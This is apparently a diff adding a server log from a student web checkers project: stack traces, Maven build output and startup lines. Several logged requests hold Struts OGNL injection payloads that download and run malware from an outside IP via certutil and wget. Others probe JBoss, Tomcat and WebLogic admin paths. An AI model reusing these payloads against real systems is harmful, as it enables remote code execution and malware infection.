+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-16] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-16] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-16] ERROR spark.http.matching.GeneralError - 
+java.lang.NullPointerException
+	at com.webcheckers.appl.PlayerLobby.containsInvalidCharacters(PlayerLobby.java:151)
+	at com.webcheckers.ui.PostSignInRoute.handle(PostSignInRoute.java:85)
+	at spark.RouteImpl$1.handle(RouteImpl.java:72)
+	at spark.http.matching.Routes.execute(Routes.java:61)
+	at spark.http.matching.MatcherFilter.doFilter(MatcherFilter.java:130)
+	at spark.embeddedserver.jetty.JettyHandler.doHandle(JettyHandler.java:50)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:1568)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:132)
+	at org.eclipse.jetty.server.Server.handle(Server.java:530)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:347)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:256)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:279)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:102)
+	at org.eclipse.jetty.io.ChannelEndPoint$2.run(ChannelEndPoint.java:124)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.doProduce(EatWhatYouKill.java:247)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.produce(EatWhatYouKill.java:140)
+	at org.eclipse.jetty.util.thread.strategy.EatWhatYouKill.run(EatWhatYouKill.java:131)
+	at org.eclipse.jetty.util.thread.ReservedThreadExecutor$ReservedThread.run(ReservedThreadExecutor.java:382)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:708)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:626)
+	at java.base/java.lang.Thread.run(Thread.java:844)
+[qtp504788386-19] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-19] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27certutil.exe%20-urlcache%20-split%20-f%20http://111.90.158.225/d/fast.exe%20c:/fast.exe&cmd.exe%20/c%20c:%5C%5Cfast.exe%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-15] INFO spark.http.matching.MatcherFilter - The requested route [/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27nohup%20uname%20--m%7Cgrep%20x86_64%20%3E%3E%20/dev/null%20%7C%7C%20(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft32%20&&%20chmod%20777%20.loop%20&&%20./.loop)&&(pkill%20loop%20%3B%20wget%20-O%20.loop%20http://111.90.158.225/d/ft64%20&&%20chmod%20777%20.loop%20&&%20./.loop)%20%26%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/index.action] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-19] INFO spark.http.matching.MatcherFilter - The requested route [/invoker/readonly] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-19] INFO spark.http.matching.MatcherFilter - The requested route [/invoker/JMXInvokerServlet] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-19] INFO spark.http.matching.MatcherFilter - The requested route [/jmx-console/HtmlAdaptor] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-19] INFO spark.http.matching.MatcherFilter - The requested route [/orders.xhtml] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-20] INFO spark.http.matching.MatcherFilter - The requested route [/users] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-20] INFO spark.http.matching.MatcherFilter - The requested route [/dba_put1.jsp/] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-15] INFO spark.http.matching.MatcherFilter - The requested route [/dba_put1.jsp] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-15] INFO spark.http.matching.MatcherFilter - The requested route [/manager/html] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-15] INFO spark.http.matching.MatcherFilter - The requested route [/wls-wsat/CoordinatorPortType] has not been mapped in Spark for Accept: [*/*]
+[qtp504788386-18] INFO spark.http.matching.MatcherFilter - The requested route [/favicon.ico] has not been mapped in Spark for Accept: [image/webp,image/apng,image/*,*/*;q=0.8]
+WARNING: An illegal reflective access operation has occurred
+WARNING: Illegal reflective access by com.google.inject.internal.cglib.core.$ReflectUtils$1 (file:/usr/share/maven/lib/guice.jar) to method java.lang.ClassLoader.defineClass(java.lang.String,byte[],int,int,java.security.ProtectionDomain)
+WARNING: Please consider reporting this to the maintainers of com.google.inject.internal.cglib.core.$ReflectUtils$1
+WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations
+WARNING: All illegal access operations will be denied in a future release
+[[1;34mINFO[m] Scanning for projects...
+[[1;34mINFO[m] 
+[[1;34mINFO[m] [1m------------------------------------------------------------------------[m
+[[1;34mINFO[m] [1mBuilding Web Checkers a'la Spark/Java8 1.0-SNAPSHOT[m
+[[1;34mINFO[m] [1m------------------------------------------------------------------------[m
+[[1;34mINFO[m] 
+[[1;34mINFO[m] [1m--- [0;32mjacoco-maven-plugin:0.8.2:prepare-agent[m [1m(jacoco-initialize)[m @ [36mcheckers-app[0;1m ---[m
+[[1;34mINFO[m] argLine set to -javaagent:/home/sean/.m2/repository/org/jacoco/org.jacoco.agent/0.8.2/org.jacoco.agent-0.8.2-runtime.jar=destfile=/home/sean/team-project-2181-swen-261-07-c-null/target/jacoco.exec,append=false
+[[1;34mINFO[m] 
+[[1;34mINFO[m] [1m--- [0;32mmaven-resources-plugin:2.6:resources[m [1m(default-resources)[m @ [36mcheckers-app[0;1m ---[m
+[[1;34mINFO[m] Using 'UTF-8' encoding to copy filtered resources.
+[[1;34mINFO[m] Copying 50 resources
+[[1;34mINFO[m] 
+[[1;34mINFO[m] [1m--- [0;32mmaven-compiler-plugin:3.8.0:compile[m [1m(default-compile)[m @ [36mcheckers-app[0;1m ---[m
+[[1;34mINFO[m] Nothing to compile - all classes are up to date
+[[1;34mINFO[m] 
+[[1;34mINFO[m] [1m--- [0;32mexec-maven-plugin:1.6.0:java[m [1m(default-cli)[m @ [36mcheckers-app[0;1m ---[m
+2019-02-13 19:43:00.092 CONFIG  [com.webcheckers.Application] WebCheckers is initializing. 
+[com.webcheckers.Application.main()] INFO spark.staticfiles.StaticFilesConfiguration - StaticResourceHandler configured with folder = /public
+2019-02-13 19:43:00.200 CONFIG  [com.webcheckers.ui.GetHomeRoute] GetHomeRoute is initialized. 
+2019-02-13 19:43:00.211 CONFIG  [com.webcheckers.ui.GetSignInRoute] SigninRoute is initialized. 
+2019-02-13 19:43:00.218 CONFIG  [com.webcheckers.ui.GetGameRoute] GetGameRoute is initialized. 
+2019-02-13 19:43:00.235 CONFIG  [com.webcheckers.ui.WebServer] WebServer is initialized. 
+2019-02-13 19:43:00.241 CONFIG  [com.webcheckers.Application] WebCheckers initialization complete. 
+[Thread-0] INFO org.eclipse.jetty.util.log - Logging initialized @7807ms to org.eclipse.jetty.util.log.Slf4jLog
+[Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - == Spark has ignited ...
+[Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - >> Listening on 0.0.0.0:4567
+[Thread-0] INFO org.eclipse.jetty.server.Server - jetty-9.4.8.v20171121, build timestamp: 2017-11-21T21:27:37Z, git hash: 82b8fb23f757335bb3329d540ce37a2a2615f0a8
+[Thread-0] INFO org.eclipse.jetty.server.session - DefaultSessionIdManager workerName=node0
+[Thread-0] INFO org.eclipse.jetty.server.session - No SessionScavenger set, using defaults
+[Thread-0] INFO org.eclipse.jetty.server.session - Scavenging every 660000ms
+[Thread-0] INFO org.eclipse.jetty.server.AbstractConnector - Started ServerConnector@42db89e9{HTTP/1.1,[http/1.1]}{0.0.0.0:4567}
+[Thread-0] INFO org.eclipse.jetty.server.Server - Started @8048ms
+[qtp1505798842-17] INFO spark.http.matching.MatcherFilter - The requested route [/favicon.ico] has not been mapped in Spark for Accept: [image/webp,image/apng,image/*,*/*;q=0.8]
